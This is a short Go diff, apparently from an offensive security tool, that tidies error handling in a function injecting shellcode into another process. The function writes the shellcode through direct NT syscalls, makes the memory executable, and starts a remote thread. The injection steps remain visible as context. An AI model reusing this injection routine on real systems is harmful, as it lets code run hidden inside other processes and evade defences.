@@ -17,18 +17,18 @@ func doNtCreateThreadEx(hProc uintptr, sc []byte) error {
 	}
 
 	if err := syscallNtWriteVirtualMemory(sm, hProc, allocAddr, sc); err != nil {
-		syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
+		_ = syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
 		return fmt.Errorf("NtWriteVirtualMemory: %w", err)
 	}
 
 	if _, err := syscallNtProtectVirtualMemory(sm, hProc, allocAddr, uintptr(len(sc)), pageExecuteRead); err != nil {
-		syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
+		_ = syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
 		return fmt.Errorf("NtProtectVirtualMemory: %w", err)
 	}
 
 	hThread, err := syscallNtCreateThreadEx(sm, hProc, allocAddr)
 	if err != nil {
-		syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
+		_ = syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
 		return fmt.Errorf("NtCreateThreadEx: %w", err)
 	}
 	procCloseHandle.Call(hThread)
